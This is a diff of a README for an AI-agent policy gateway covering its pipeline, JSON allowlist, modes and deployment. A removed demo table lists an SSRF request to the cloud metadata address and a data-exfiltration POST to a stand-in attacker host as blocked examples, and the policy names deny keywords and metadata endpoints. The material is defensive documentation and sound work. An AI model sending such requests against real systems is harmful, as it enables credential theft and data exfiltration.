@@ -1,111 +1,78 @@
-# Agent Policy Gateway — Zero Trust Policy Gateway for AI Agents
+# Agent Policy Gateway
 
-> **Guardrails hope. Agent Policy Gateway guarantees.**
-
-Agent Policy Gateway is a deterministic policy enforcement gateway that sits between AI agents and target systems (databases, APIs, cloud services). It inspects every action an agent wants to take, evaluates it against an immutable allowlist, and either permits or denies execution — in under 1 millisecond.
-
-No LLM in the enforcement path. No probabilistic checks. Just code.
-
----
-
-## Why Agent Policy Gateway Exists
-
-Every enterprise is deploying AI agents. Those agents need to access databases, APIs, and cloud resources. Today there's no control plane — agents either get full access or no access.
-
-**The problem with guardrails:**
-
-| | LLM Guardrails | Agent Policy Gateway |
-|---|---|---|
-| Enforcement | Probabilistic (another LLM judges safety) | Deterministic (code-based allowlist) |
-| Bypass risk | High — prompt injection can trick the guard | Zero — allowlist is code, not conversation |
-| Latency | 200-800ms (LLM inference) | **0.036ms** (CPU evaluation) |
-| Multi-agent | Each agent needs its own guardrail | One gateway for all agents |
-| Audit trail | "The model said it looked OK" | `policy.json` rule X matched, correlation_id Y |
-| Cost per 1M checks | $500-2000 (LLM API calls) | ~$0.50 (CPU compute) |
-
-Agent Policy Gateway doesn't replace guardrails — it complements them. Guardrails are Layer 1 (input filtering). Agent Policy Gateway is Layer 3 (execution boundary). If the guardrail misses something, Agent Policy Gateway catches it. Guaranteed.
+Deterministic policy enforcement gateway that sits between AI agents and target systems (databases, APIs, cloud services). Every action an agent attempts is evaluated against an immutable JSON allowlist — permitted or denied in under 1ms. No LLM in the enforcement path.
 
 ---
 
 ## Architecture
 
 ```
-┌─────────────────────────────────────────────────────────────┐
-│                    AI Agents (Any LLM)                        │
-│  ┌──────┐ ┌──────┐ ┌──────┐ ┌──────┐ ┌──────┐            │
-│  │GPT-4 │ │Claude│ │Ollama│ │Gemini│ │Custom│            │
-│  └──┬───┘ └──┬───┘ └──┬───┘ └──┬───┘ └──┬───┘            │
-│     └─────────┴─────────┴─────────┴─────────┘              │
-│                         │                                    │
-│              ┌──────────▼──────────┐                        │
-│              │   Agent Policy Gateway Gateway  │ ← Deterministic policy │
-│              │                     │                        │
-│              │  Auth → Schema →    │                        │
-│              │  Policy → Egress →  │   policy.json          │
-│              │  Quota → STS Mint → │   (immutable)          │
-│              │  Execute → Filter → │                        │
-│              │  Audit              │                        │
-│              └──────────┬──────────┘                        │
-│                         │                                    │
-│              ┌──────────▼──────────┐                        │
-│              │   Target Systems    │                        │
-│              │  DB · APIs · Cloud  │                        │
-│              └─────────────────────┘                        │
-└─────────────────────────────────────────────────────────────┘
+┌─────────────────────────────────────────────────────────────────┐
+│                      AI Agents (Any LLM)                         │
+│   GPT-4 · Claude · Ollama · Gemini · Custom                     │
+└──────────────────────────┬──────────────────────────────────────┘
+                           │
+                ┌──────────▼──────────┐
+                │   Agent Policy      │
+                │   Gateway           │  ← Deterministic policy enforcement
+                │                     │
+                │  Auth → Schema →    │
+                │  Policy → Egress →  │     policy.json (immutable)
+                │  Quota → STS Mint → │
+                │  Execute → Filter → │
+                │  Audit              │
+                └──────────┬──────────┘
+                           │
+                ┌──────────▼──────────┐
+                │   Target Systems    │
+                │  DB · APIs · Cloud  │
+                └─────────────────────┘
 ```
+
+### Enforcement Pipeline
+
+Every request passes through a fixed-order pipeline. If any stage fails, the request is denied and the pipeline halts.
+
+```
+authenticate → schema validate → policy evaluate → egress control →
+quota check → credential mint → execute action → filter response → audit
+```
+
+1. **Authentication** — Bearer token verified via HMAC constant-time comparison
+2. **Schema validation** — JSON-RPC 2.0 envelope structure check
+3. **Policy evaluation** — tool allowed? operation permitted? keywords blocked?
+4. **Egress control** — destination in allowlist? not in deny list?
+5. **Quota check** — within per-session rate limits?
+6. **STS mint** — short-lived AWS credentials scoped to one action (15min TTL)
+7. **Execute** — action performed with scoped credentials
+8. **Response filter** — redact secrets/PII (SSN, AWS keys, JWTs, private keys)
+9. **Credential discard** — memory zeroed immediately
+10. **Audit** — append-only structured log with correlation ID
 
 ### Zero Trust Principles
 
-- **Never trust, always verify** — every request goes through the full pipeline
 - **Default deny** — nothing is allowed unless explicitly in the policy
 - **Least privilege** — STS mints credentials scoped to exactly one action
 - **No standing access** — credentials live for milliseconds, not minutes
 - **Assume breach** — agents hold zero secrets; compromised agent = zero escalation
-- **Full audit** — every decision is logged with correlation IDs
+- **Full audit** — every decision logged with correlation IDs
 
 ---
 
-## Performance
-
-Benchmarked on a single Python process (no GPU, no special hardware):
-
-| Operation | Latency | Throughput |
-|---|---|---|
-| Token verification (HMAC-SHA256) | 0.020ms | 50,769/sec |
-| Policy evaluation (ALLOW) | 0.010ms | 103,024/sec |
-| Policy evaluation (DENY) | 0.003ms | 399,073/sec |
-| **Full pipeline (auth + policy)** | **0.036ms** | **27,713/sec** |
-
-### Scaling estimates
-
-| Deployment | Configuration | Throughput |
-|---|---|---|
-| Single process | 1 worker | ~5,000 req/sec (with HTTP overhead) |
-| Small | 4 workers, 1 server | ~20,000 req/sec |
-| Medium | 8 workers, 1 server | ~40,000 req/sec |
-| Large | 4 pods × 8 workers | ~160,000 req/sec |
-| Platform | 10 pods × 16 workers | ~500,000+ req/sec |
-
-The policy engine is pure CPU computation — no database, no network, no LLM inference. Scales linearly with cores.
-
----
-
-## Microservices Architecture
-
-Agent Policy Gateway runs as 6 containerized services:
+## Microservices
 
 | Service | Port | Responsibility |
 |---------|------|----------------|
-| **Frontend** (Next.js) | 3000 | Dashboard UI — login, pipeline viz, demos |
-| **Auth Service** (FastAPI) | 8001 | JWT authentication, SSO-ready |
-| **Gateway** (FastAPI) | 8000 | Policy enforcement, STS mint, audit |
-| **Agent Service** (FastAPI) | 8002 | LLM provider abstraction, demo scenarios |
+| **Frontend** (Next.js) | 3000 | Dashboard UI — login, pipeline visualization, demos |
+| **Auth** (FastAPI) | 8001 | JWT authentication, pluggable SSO providers |
+| **Gateway** (FastAPI) | 8000 | Policy enforcement, STS mint, egress control, audit |
+| **Agent** (FastAPI) | 8002 | LLM provider abstraction, demo scenarios |
 | **PostgreSQL** | 5432 | Audit logs, user accounts |
 | **Floci** (AWS emulator) | 4566 | STS credential minting (dev); real AWS in prod |
 
 ```
 ┌─────────────────────────────────────────────────────────┐
-│                   Docker / AKS Cluster                    │
+│                   Docker / Kubernetes                     │
 │                                                           │
 │  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌────────┐ │
 │  │ Frontend │  │   Auth   │  │ Gateway  │  │ Agent  │ │
@@ -125,37 +92,39 @@ Agent Policy Gateway runs as 6 containerized services:
 
 ## Quick Start
 
-### Run locally with Docker (one command):
+### Docker (one command)
 
 ```bash
 docker compose up --build
 ```
 
-Open http://localhost:3000 and login:
-- **Workspace:** Agent Policy Gateway
-- **Email:** admin@Agent Policy Gateway.dev
-- **Password:** Agent Policy Gateway-demo
+Open http://localhost:3000 — login with `admin@apg.dev` / `apg-demo` / workspace `apg`.
 
-> ⚠️ These are **demo credentials** for local testing only. In production, set your own via environment variables (`Agent Policy Gateway_OPERATOR_EMAIL`, `Agent Policy Gateway_OPERATOR_PASSWORD`) or switch to SSO.
+### Without Docker
 
-### Run without Docker (development):
+```bash
+# Backend
+export APG_AGENT_TOKEN="test-token"
+python -m uvicorn agent_policy_gateway.main:app --port 8000 --reload
 
-```powershell
-# Terminal 1 — Backend
-$env:Agent Policy Gateway_AGENT_TOKEN="test-token"
-python -m uvicorn Agent Policy Gateway.main:app --port 8000 --reload
-
-# Terminal 2 — Frontend
-cd frontend
-npm install
-npm run dev
+# Frontend
+cd frontend && npm install && npm run dev
 ```
+
+### CLI (standalone proxy)
+
+```bash
+pip install -e .
+apg proxy --target http://localhost:9000 --policy policy.json
+```
+
+Point your MCP client at the gateway instead of the target server. Done.
 
 ---
 
-## How Policy Works
+## Policy
 
-The policy is a JSON allowlist loaded at startup. It directly maps to MCP `tools/call` requests:
+The policy is a JSON allowlist loaded at startup. Maps directly to MCP `tools/call` requests:
 
 ```json
 {
@@ -165,231 +134,137 @@ The policy is a JSON allowlist loaded at startup. It directly maps to MCP `tools
     "db.query": {
       "allow": true,
       "operations": ["select"],
-      "tables": ["customers", "orders", "products"],
+      "tables": ["customers", "orders"],
       "deny_keywords": ["DROP", "DELETE", "UPDATE", "INSERT"],
-      "destination_whitelist": [],
-      "deny_destinations": [],
-      "aws_role": "arn:aws:iam::123456789012:role/Agent Policy Gateway-DBQuery"
+      "aws_role": "arn:aws:iam::123456789012:role/APG-DBQuery"
     },
     "http.post": {
       "allow": true,
       "destination_whitelist": ["https://api.example.com"],
-      "deny_destinations": ["169.254.169.254", "metadata.google.internal"]
+      "deny_destinations": ["169.254.169.254"]
     }
   }
 }
 ```
 
-### What gets checked on every request:
+---
 
-1. **Authentication** — Bearer token verified (HMAC constant-time)
-2. **Schema validation** — JSON-RPC 2.0 envelope valid
-3. **Policy evaluation** — tool allowed? operation permitted? keywords blocked?
-4. **Egress control** — destination in allowlist? not in deny list?
-5. **Quota check** — within rate limits?
-6. **STS mint** — short-lived credentials (15min TTL, actual use: milliseconds)
-7. **Execute** — action performed with scoped credentials
-8. **Response filter** — redact PII (SSN, passwords, tokens)
-9. **Credential discard** — memory zeroed immediately
-10. **Audit** — append-only log with correlation ID
+## Operating Modes
 
-If any step fails → **DENIED. Pipeline halted. No execution. No credentials minted.**
+| Mode | Behavior |
+|------|----------|
+| **Enforce** (default) | Denied requests are blocked. No execution. |
+| **Audit** | Denied requests are logged but still executed. Use for gradual rollout. |
+
+Set via `APG_MODE=enforce` or `APG_MODE=audit`.
 
 ---
 
-## Live Demo Scenarios
+## Performance
 
-The system includes 4 real scenarios demonstrating enforcement:
+Benchmarked on a single Python process:
 
-| # | Scenario | Agent Action | Outcome | Blocked At |
-|---|----------|--------------|---------|------------|
-| 1 | Read Customers | `SELECT name, email, ssn FROM customers` | ✅ ALLOWED | — (SSN redacted in response) |
-| 2 | Delete Records | `DELETE FROM customers WHERE ...` | ❌ DENIED | Policy Eval |
-| 3 | SSRF Attack | `GET http://169.254.169.254/meta-data/` | ❌ DENIED | Egress Control |
-| 4 | Data Exfiltration | `POST https://evil.attacker.com/collect` | ❌ DENIED | Egress Control |
+| Operation | Latency | Throughput |
+|---|---|---|
+| Token verification (HMAC-SHA256) | 0.020ms | 50,769/sec |
+| Policy evaluation (ALLOW) | 0.010ms | 103,024/sec |
+| Policy evaluation (DENY) | 0.003ms | 399,073/sec |
+| **Full pipeline** | **0.036ms** | **27,713/sec** |
 
-These run against a real SQLite database with real LLM-generated queries (Ollama, OpenAI, or mock).
-
----
-
-## LLM Provider (Pluggable)
-
-The agent service supports any LLM provider via a simple protocol:
-
-```bash
-# Local (Ollama)
-LLM_PROVIDER=ollama
-OLLAMA_MODEL=llama3.2
-
-# Cloud
-LLM_PROVIDER=openai
-OPENAI_API_KEY=sk-...
-
-# Or
-LLM_PROVIDER=anthropic
-ANTHROPIC_API_KEY=sk-ant-...
-
-# Custom microservice
-LLM_PROVIDER=microservice
-LLM_SERVICE_URL=http://your-model:8001
-
-# No LLM needed for demos
-LLM_PROVIDER=mock
-```
-
-Agent Policy Gateway doesn't care what generates the intent. The policy enforcement is deterministic regardless of which LLM is used.
+Scales linearly with cores. The gateway auto-scales from 2 to 20 pods via HPA (70% CPU threshold).
 
 ---
 
-## Deploy to AKS
+## Environment Variables
+
+| Variable | Description |
+|----------|-------------|
+| `APG_AGENT_TOKEN` | Bearer token for agent authentication |
+| `APG_JWT_SECRET` | Secret for signing operator JWTs |
+| `APG_OPERATOR_EMAIL` | Operator login email |
+| `APG_OPERATOR_PASSWORD` | Operator login password |
+| `APG_OPERATOR_WORKSPACE` | Workspace identifier |
+| `APG_MODE` | `enforce` or `audit` |
+| `LLM_PROVIDER` | `mock`, `ollama`, `openai`, `anthropic`, `microservice` |
+| `DATABASE_URL` | PostgreSQL connection string |
+
+---
+
+## Deploy to Kubernetes
 
 ```powershell
-# Build images
-$env:CONTAINER_REGISTRY = "Agent Policy Gateway.azurecr.io"
-./deploy.ps1 build
-
-# Push to registry
-./deploy.ps1 push
-
-# Deploy to AKS
-./deploy.ps1 aks
+./deploy.ps1 build   # build images
+./deploy.ps1 push    # push to registry
+./deploy.ps1 aks     # apply k8s manifests
 ```
 
-The gateway auto-scales from 2 to 20 pods based on CPU utilization (HPA configured at 70%).
-
-### Production: Switch from Floci to Real AWS
-
-```yaml
-# Remove these env vars from gateway:
-AWS_ENDPOINT_URL: http://floci:4566  # ← delete this line
-
-# Use IAM role on the pod (IRSA) — no keys needed
-# Or set real credentials in Kubernetes secrets
-```
-
----
-
-## Auth Service (SSO-Ready)
-
-The auth service uses a provider protocol. To switch to SSO:
-
-```python
-# Current: local credential check
-class LocalAuthProvider:
-    def authenticate(self, workspace, email, password) -> UserInfo | None: ...
-
-# Future: implement the same interface for OIDC
-class OIDCProvider:
-    def authenticate(self, workspace, email, password) -> UserInfo | None: ...
-    def validate_sso_token(self, token) -> UserInfo | None: ...
-```
-
-Swap the provider in `auth_service/router.py` — no other code changes needed.
+Production: remove `AWS_ENDPOINT_URL` from gateway env to use real AWS STS instead of Floci.
 
 ---
 
 ## Project Structure
 
 ```
-MCPGate/
-├── docker-compose.yml          # One command: docker compose up --build
-├── deploy.ps1                  # Deploy: local / build / push / aks
-├── policy.json                 # Immutable policy (the source of truth)
-├── pyproject.toml              # Python dependencies
+Agent-Policy-Gateway/
+├── docker-compose.yml              # docker compose up --build
+├── deploy.ps1                      # build / push / deploy
+├── policy.json                     # immutable policy (source of truth)
+├── pyproject.toml                  # Python package config
 │
-├── services/                   # Docker build contexts
-│   ├── frontend/Dockerfile
-│   ├── auth/Dockerfile
+├── services/                       # Docker build contexts
 │   ├── gateway/Dockerfile
+│   ├── auth/Dockerfile
 │   ├── agent/Dockerfile
+│   ├── frontend/Dockerfile
 │   └── postgres/init.sql
 │
-├── k8s/                        # Kubernetes manifests (AKS)
+├── k8s/                            # Kubernetes manifests
 │   ├── namespace.yaml
 │   ├── secrets.yaml
-│   ├── gateway-deployment.yaml # 3 replicas + HPA
+│   ├── gateway-deployment.yaml     # 3 replicas + HPA
 │   ├── auth-deployment.yaml
 │   ├── frontend-deployment.yaml
-│   └── ingress.yaml            # NGINX + TLS
+│   └── ingress.yaml                # NGINX + TLS
 │
-├── frontend/                   # Next.js 14 dashboard
+├── frontend/                       # Next.js 14 dashboard
 │   └── src/
-│       ├── app/                # Pages (login, dashboard, demos, audit)
-│       ├── components/         # Sidebar, shared UI
-│       ├── lib/                # API client, auth helpers
-│       └── middleware.ts       # Runtime service routing
+│       ├── app/                    # Pages (login, dashboard, demos, audit)
+│       ├── components/             # Sidebar, shared UI
+│       └── lib/                    # API client, auth helpers
 │
-├── src/Agent Policy Gateway/               # Python source
-│   ├── main.py                 # Monolith app (dev mode)
-│   ├── services/               # Microservice entry points
-│   ├── auth_service/           # JWT + pluggable providers
-│   ├── dashboard_api/          # REST API + live pipeline stats
-│   ├── live_demo/              # LLM providers + scenarios + SQLite
-│   ├── policy.py               # Policy evaluator
-│   ├── sts_broker.py           # AWS STS credential minting
-│   ├── egress.py               # Egress control (allowlist/denylist)
-│   ├── filter.py               # Response PII redaction
-│   ├── audit.py                # Append-only audit logger
-│   └── session.py              # Quota management
+├── src/agent_policy_gateway/       # Python source
+│   ├── main.py                     # Monolith app (dev mode)
+│   ├── cli.py                      # CLI entry point (apg command)
+│   ├── proxy_app.py                # Standalone transparent proxy
+│   ├── services/                   # Microservice entry points
+│   ├── auth_service/               # JWT + pluggable providers
+│   ├── dashboard_api/              # REST API for frontend
+│   ├── live_demo/                  # LLM providers + demo scenarios
+│   ├── policy.py                   # Deterministic policy evaluator
+│   ├── sts_broker.py               # AWS STS credential minting
+│   ├── egress.py                   # Egress control
+│   ├── filter.py                   # Response PII redaction
+│   ├── audit.py                    # Append-only audit logger
+│   ├── session.py                  # Quota management
+│   └── mode.py                     # Enforce/Audit mode control
 │
-└── tests/                      # 218 passing tests
+└── tests/                          # pytest test suite
 ```
 
 ---
 
 ## Tech Stack
 
-| Component | Technology | Why |
-|-----------|-----------|-----|
-| Gateway | Python 3.13 + FastAPI | Fast iteration, async I/O, type-safe |
-| Frontend | Next.js 14 + Tailwind | Dark theme dashboard, SSR-ready |
-| Database | PostgreSQL 16 | Audit trail, user accounts |
-| Credential Minting | AWS STS | Per-request, downscoped, 15min TTL |
-| Local AWS Testing | Floci | Free, fast (53ms cold start), 45+ services |
-| LLM Integration | Ollama / OpenAI / Anthropic | Pluggable, any provider |
-| Container Runtime | Docker + Kubernetes | Production-ready, auto-scaling |
-| Tests | pytest (218 tests) | Full coverage of enforcement pipeline |
-
----
-
-## Who Is This For
-
-| Buyer | Pain Point | Agent Policy Gateway Solution |
-|-------|-----------|-------------------|
-| **CISO** | "AI agents will be our next breach" | Zero Trust enforcement, full audit trail |
-| **Platform Engineering** | "Need governance for internal AI tools" | One gateway, per-agent policies |
-| **Compliance** | "How do I prove AI agents aren't accessing restricted data?" | Deterministic decisions, correlation IDs, SOC2-compatible logs |
-| **AI Engineers** | "Security team keeps blocking our agent deployments" | Ship agents with guardrails the security team trusts |
-
----
-
-## Agent Policy Gateway vs Alternatives
-
-| | Agent Policy Gateway | NeMo Guardrails | Lakera Guard | Custom IAM |
-|---|---|---|---|---|
-| Enforcement | Deterministic (code) | Probabilistic (LLM) | Probabilistic (classifier) | Static permissions |
-| Latency | 0.036ms | 200-800ms | 50-200ms | 0ms (no check) |
-| Per-request credentials | ✅ | ❌ | ❌ | ❌ |
-| Multi-agent policy | ✅ | ❌ | ❌ | Manual |
-| Response filtering | ✅ (PII redaction) | ❌ | ❌ | ❌ |
-| Audit trail | ✅ (correlation IDs) | Partial | Partial | CloudTrail |
-| Bypass via prompt injection | Impossible | Possible | Possible | N/A |
-
----
-
-## Contributing
-
-```bash
-# Setup
-pip install -e ".[dev]"
-export Agent Policy Gateway_AGENT_TOKEN=test-token
-
-# Run tests
-pytest tests/ -x -q
-
-# Run locally
-python -m uvicorn Agent Policy Gateway.main:app --port 8000 --reload
-```
+| Component | Technology |
+|-----------|-----------|
+| Gateway | Python 3.13 + FastAPI |
+| Frontend | Next.js 14 + Tailwind CSS |
+| Database | PostgreSQL 16 |
+| Credential Minting | AWS STS (per-request, downscoped) |
+| Local AWS | Floci (dev); real AWS (prod) |
+| LLM Integration | Ollama / OpenAI / Anthropic (pluggable) |
+| Orchestration | Docker Compose / Kubernetes |
+| Tests | pytest |
 
 ---
 
